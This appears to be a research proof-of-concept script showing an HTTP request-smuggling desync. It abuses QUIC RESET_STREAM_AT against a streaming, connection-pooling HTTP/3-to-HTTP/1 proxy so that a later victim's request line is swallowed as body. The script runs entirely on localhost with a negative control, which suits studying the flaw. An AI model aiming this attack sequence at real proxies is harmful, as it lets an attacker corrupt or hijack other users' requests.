"""Reference H3->H1 downgrader that honors reliable-stream-reset, to demonstrate the
retroactive-truncation desync end to end. The downgrader does three things a REASONABLE
streaming proxy does, none contrived:
  1. streams the H3 request body to a pooled H1 backend as it arrives (low latency),
  2. forwards the client Content-Length to the backend as-is,
  3. honors RESET_STREAM_AT (the extension: a shrinking reliable size means that much of
     the body was delivered) and RETURNS the backend connection to the pool.

The desync is inherent to combining these: the bytes and the Content-Length are already
committed to the backend when the reliable size shrinks, and the front cannot un-send
them. The claim is not "a buggy proxy", it is "reliable-stream-reset is incompatible with
streaming + connection-reusing H3->H1 downgrade". Attacker = the Phage ResetStreamAt gene.
Victim = a normal request on the pooled backend, whose request-line the backend consumes
as the attacker's missing body.

Self-contained: inline pooled CL backend + the downgrader + the Phage attack + a negative
control. Run: python reference_downgrader.py"""
import asyncio, socket, ssl, sys, threading, time
sys.path.insert(0, "/home/j4kuuu/Desktop/tools/Phage/src")
from aioquic.asyncio import connect, serve
from aioquic.asyncio.protocol import QuicConnectionProtocol
from aioquic.h3.connection import H3_ALPN, H3Connection
from aioquic.h3.events import DataReceived, HeadersReceived
from aioquic.quic.configuration import QuicConfiguration
from aioquic.quic.events import ProtocolNegotiated
from phage.evo import genome as G
from phage.evo.driver import drive
from phage.evo.quic_ext import enable_reliable_reset

BACKEND = ("127.0.0.1", 8082)
DOWN_PORT = 4490
BACKEND_LOG = []   # request-lines the backend framed (poison = victim line missing)
POOL = []          # idle backend sockets (http-reuse always)


# --- inline pooled CL-enforcing keep-alive HTTP/1 backend (conn_bk logic) ---
def backend_server():
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(BACKEND)
    s.listen(8)
    while True:
        c, _ = s.accept()
        threading.Thread(target=backend_handle, args=(c,), daemon=True).start()


def backend_handle(c):
    buf = b""
    try:
        while True:
            while b"\r\n\r\n" not in buf:
                d = c.recv(4096)
                if not d:
                    return
                buf += d
            head, buf = buf.split(b"\r\n\r\n", 1)
            BACKEND_LOG.append(head.split(b"\r\n", 1)[0])
            cl = 0
            for line in head.split(b"\r\n"):
                if line.lower().startswith(b"content-length:"):
                    try:
                        cl = int(line.split(b":", 1)[1].strip())
                    except ValueError:
                        cl = 0
            # respond early (like nginx/conn_bk), then drain exactly cl body bytes
            c.sendall(b"HTTP/1.1 200 OK\r\nContent-Length: 3\r\nConnection: keep-alive\r\n\r\nok\n")
            while len(buf) < cl:
                d = c.recv(4096)
                if not d:
                    return
                buf += d
            buf = buf[cl:]
    except OSError:
        return


def get_backend():
    return POOL.pop() if POOL else socket.create_connection(BACKEND)


def return_backend(s):
    POOL.append(s)  # http-reuse always


# --- reference downgrader ---
class Downgrader(QuicConnectionProtocol):
    def __init__(self, *a, **k):
        super().__init__(*a, **k)
        h = self._quic._QuicConnection__frame_handlers
        h[0x24] = (self._on_reset_at, h[0x04][1])  # accept RESET_STREAM_AT (extension enabled)
        self._http = None
        self._streams = {}

    def _on_reset_at(self, context, frame_type, buf):
        sid = buf.pull_uint_var()
        buf.pull_uint_var()  # error code
        buf.pull_uint_var()  # final size
        buf.pull_uint_var()  # reliable size
        st = self._streams.get(sid)
        if st and st.get("backend") is not None:
            # honor: request delivered up to `reliable`; return the mid-body conn to the pool
            return_backend(st["backend"])
            st["backend"] = None

    def quic_event_received(self, event):
        if isinstance(event, ProtocolNegotiated):
            self._http = H3Connection(self._quic)
        if self._http is None:
            return
        for e in self._http.handle_event(event):
            if isinstance(e, HeadersReceived):
                hdrs = dict(e.headers)
                method = hdrs.get(b":method", b"GET")
                path = hdrs.get(b":path", b"/")
                cl = hdrs.get(b"content-length", b"0")
                b = get_backend()
                b.sendall(method + b" " + path + b" HTTP/1.1\r\nHost: lab\r\n"
                          + b"Content-Length: " + cl + b"\r\n\r\n")
                self._streams[e.stream_id] = {"backend": b}
                self._http.send_headers(e.stream_id, [(b":status", b"200")], end_stream=False)
                self._http.send_data(e.stream_id, b"ok", end_stream=True)
            elif isinstance(e, DataReceived):
                st = self._streams.get(e.stream_id)
                if st and st.get("backend") is not None:
                    st["backend"].sendall(e.data)  # stream body to backend as it arrives
                    if e.stream_ended:
                        return_backend(st["backend"])
                        st["backend"] = None


def run_downgrader(ready):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    cfg = QuicConfiguration(is_client=False, alpn_protocols=H3_ALPN)
    cfg.load_cert_chain("lab.crt", "lab.key")

    async def go():
        await serve("127.0.0.1", DOWN_PORT, configuration=cfg, create_protocol=Downgrader)
        ready.set()
        await asyncio.Future()

    loop.run_until_complete(go())


# --- Phage clients ---
async def fire(genome, reliable_reset=False):
    cfg = QuicConfiguration(is_client=True, alpn_protocols=H3_ALPN)
    cfg.verify_mode = ssl.CERT_NONE
    async with connect("127.0.0.1", DOWN_PORT, configuration=cfg) as c:
        await asyncio.wait_for(c.wait_connected(), 5)
        if reliable_reset:
            enable_reliable_reset(c._quic)
        http = H3Connection(c._quic)
        sid = c._quic.get_next_available_stream_id()
        await drive(http, c._quic, sid, genome, transmit=c.transmit)
        await asyncio.sleep(0.6)


def H(path, cl):
    return G.Headers(((b":method", b"POST"), (b":scheme", b"https"),
                      (b":authority", b"lab"), (b":path", path),
                      (b"content-length", str(cl).encode())), end_stream=False)


def scenario(label, attacker_genome, reliable_reset):
    POOL.clear()
    BACKEND_LOG.clear()
    # attacker on one QUIC connection
    asyncio.new_event_loop().run_until_complete(fire(attacker_genome, reliable_reset))
    time.sleep(0.3)
    # victim on a fresh QUIC connection (reuses the pooled backend)
    victim = [H(b"/VICTIM", 4), G.Data(b"VVVV", end_stream=True)]
    asyncio.new_event_loop().run_until_complete(fire(victim))
    time.sleep(0.4)
    victim_clean = any(b"POST /VICTIM " in ln for ln in BACKEND_LOG)
    print(f"\n### {label}")
    print(f"  backend saw: {[ln.decode('latin1') for ln in BACKEND_LOG]}")
    print(f"  victim request-line intact at backend: {victim_clean}")
    print(f"  => {'CLEAN' if victim_clean else '*** POISONED (retroactive truncation desync) ***'}")
    return victim_clean


ready = threading.Event()
threading.Thread(target=backend_server, daemon=True).start()
threading.Thread(target=run_downgrader, args=(ready,), daemon=True).start()
ready.wait(5)
time.sleep(0.3)

# negative control: attacker sends a WELL-FORMED request (CL matches body, no reset)
ctrl = scenario("NEG CONTROL: attacker well-formed CL=4 + body",
                [H(b"/ctl", 4), G.Data(b"AAAA", end_stream=True)], reliable_reset=False)

# attack: CL=100, send 50 body bytes, then RESET_STREAM_AT reliable=5 (retroactive shrink)
atk = scenario("ATTACK: CL=100, 50 bytes sent, RESET_STREAM_AT reliable=5",
               [H(b"/evil", 100), G.Data(b"A" * 50, end_stream=False),
                G.ResetStreamAt(error_code=0x10C, final_size=50, reliable_size=5)],
               reliable_reset=True)

print("\n" + "=" * 55)
print("RESULT:", "mechanism demonstrated (control clean, attack poisons)"
      if (ctrl and not atk) else "not demonstrated")
